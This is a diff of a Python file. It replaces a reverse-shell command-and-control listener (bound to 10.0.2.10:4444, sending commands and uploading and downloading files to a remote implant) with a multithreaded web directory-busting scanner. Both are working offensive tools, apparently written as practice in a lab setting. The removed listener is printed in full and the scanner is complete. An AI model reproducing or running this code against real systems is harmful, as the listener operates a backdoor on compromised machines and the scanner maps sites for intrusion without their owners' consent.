@@ -1,63 +1,59 @@
-import socket
-import simplejson
-import base64
+import sys
+import requests
+import argparse
+import concurrent.futures
 
-class SocketListener:
-    def __init__(self, ip, port):
-        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        my_listener.bind((ip, port))
-        my_listener.listen(0)
-        print("Listening...")
-        (self.my_connection, my_address) = my_listener.accept()
-        print("Connection OK. from" + str(my_address))
+def user_input():
+    parser = argparse.ArgumentParser(description="Python Directory Buster")
+    parser.add_argument("-w", "--wordlist", dest="wordlist", required=True, help="Enter wordlist name")
+    parser.add_argument("-u", "--url", dest="target_url", required=True, help="Enter url name")
+    parser.add_argument("-x", "--extension", nargs="+", dest="extensions", required=False, help="Enter target extensions")
+    return parser.parse_args()
 
-    def json_send(self, data):
-        json_data = simplejson.dumps(data)
-        self.my_connection.send(json_data.encode("utf-8"))
+def target_urls(base_url, wordlist, extensions):
+    target_url_list = []
+    try:
+        with open(wordlist, "r") as my_file:
+            for line in my_file:
+                endpoint = line.strip()
+                if not endpoint:
+                    continue
 
-    def json_receive(self):
-        json_data = ""
-        while True:
-            try:
-                json_data = json_data + self.my_connection.recv(1024).decode()
-                return simplejson.loads(json_data)
-            except ValueError:
-                continue
+                target_url_list.append(f"{base_url}{endpoint}")
+                if(extensions):
+                    for ext in extensions:
+                        if not ext.startswith("."):
+                            target_url_list.append(f"{base_url}{endpoint}.{ext}")
+                        else:
+                            target_url_list.append(f"{base_url}{endpoint}{ext}")
 
-    def command_execution(self, command_input):
-        self.json_send(command_input)
+            return target_url_list
 
-        if command_input[0] == "exit":
-            self.my_connection.close()
-            exit()
-        return self.json_receive()
+    except FileNotFoundError:
+        print(f"{wordlist} could not found !")
+        sys.exit(1)
 
-    def save_file(self, path, content):
-        with open(path, "wb") as my_file:
-            my_file.write(base64.b64decode(content))
-            return "Download OK"
+def send_request(target_url):
+    try:
+        response = requests.get(target_url, timeout=3)
 
-    def read_file_contents(self, path):
-        with open(path, "rb") as my_file:
-            return base64.b64encode(my_file.read())
-
-    def start_listener(self):
-        while True:
-            command_input = input("Enter command: ").split(" ")
-            try:
-                if command_input[0] == "upload":
-                    my_file_content = self.read_file_contents(command_input[1])
-                    command_input.append(my_file_content)
-
-                command_output = self.command_execution(command_input)
-
-                if command_input[0] == "download" and "Error!" not in command_output:
-                    command_output = self.save_file(command_input[1], command_output)
-            except Exception:
-                command_output = "Error"
-            print(command_output)
+        if (response.status_code == 200):
+            print(f"[+] Found: {target_url} (Status: {response.status_code})")
+        else:
+            pass
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Connection Error -> {target_url}")
 
 
-my_socket_listener = SocketListener("10.0.2.10",4444)
-my_socket_listener.start_listener()
+args = user_input()
+wordlist = args.wordlist
+base_url = args.target_url
+extensions = args.extensions
+
+if not base_url.endswith("/"):
+    base_url+="/"
+
+target_url_list = target_urls(base_url, wordlist, extensions)
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    executor.map(send_request, target_url_list)
